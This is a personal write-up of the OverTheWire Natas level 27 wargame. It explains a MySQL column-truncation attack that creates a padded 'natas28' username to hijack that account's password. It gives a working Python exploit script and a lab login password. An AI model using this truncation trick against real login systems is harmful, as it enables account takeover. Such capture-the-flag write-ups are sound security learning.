
2024-08-03 14:07

Source: #natas #web 

Tags: [[SQL injection]] [[PHP]]

> [!NOTE]
> ### aka SQL Buffer overflow 

we have a login page
Basically, this code will check if the user exists in the database and if you got the right password, it will display the password. If the user does not exists, it will be created in the database

- HTML entities is PHP's notion and attempt to secure things down, like remove all the HTML entities if you were to try and do like cross-site scripting or inject HTML elements or JavaScript code into an input field's

- `mysql_real_escape_string` function is another PHP mitigation function that will try and lock down or protect a lot of regular sequel injection techniques

```php
function dumpData($link,$usr){ 
     
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            while ($row = mysql_fetch_assoc($res)) {  
                //return print_r($row); 
                return print_r($row,true); 
            } 
        } 
    } 
    return False; 
} 
```
it will return a number of rows and if it's greater than 0 we have multiple results, so what it does is it does this while loop that it iterates through every single row (this is peculiar right?) because we only expected it to return one result like if there's only one user we're trying to login as a specific user that would probably just be one, but what if we are in the case if there are multiple results if there are multiple rows to look through

since the DB described has a 64 varchar size, we create a user named longer than the length that is setup.
we input a word with spaces that are more than 64 size and append some character in the end
the spaces are eventually truncated along with the character appended at the end 

we create a user named `"natas28" + " "*58 + "x"` and in the next request we ask for `natas28` and give the password that we used for our user. since MySQL will truncate the input to match the maximum field size. the server returns original natas28's password.  
##### In the old version of this level the above mentioned trick worked 
below is the code that works on the newer version 

```python
import requests
username = 'natas27'
password = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'

url = 'http://natas27.natas.labs.overthewire.org/'  
session = requests.session()

response = session.post(url, data = {"username": "natas28" + "\x00"*58 +"x", "password": "12" },auth =(username,password))

response = session.post(url, data = {"username": "natas28" , "password": "12" },auth =(username,password))
print(response.text)
```

### References

awesome explanation - [OverTheWire Wargames :: Natas :: Level 27 (n0j.github.io)](https://n0j.github.io/2017/07/20/otw-natas-27.html)

writeups with correct answers - 
https://github.com/timruff/overthewire/blob/main/natas/natas27/exploit.py
https://www.youtube.com/watch?v=87BKWwGEF1Q

writeups with incorrect answers - 
https://www.youtube.com/watch?v=Y7WXxmWKfxs
https://axcheron.github.io/writeups/otw/natas/
https://ivanitlearning.wordpress.com/2020/02/02/overthewire-natas2729/

https://sqltest.net/ - we can just experiment with sequel database and a quick and easy way without spinning up a server.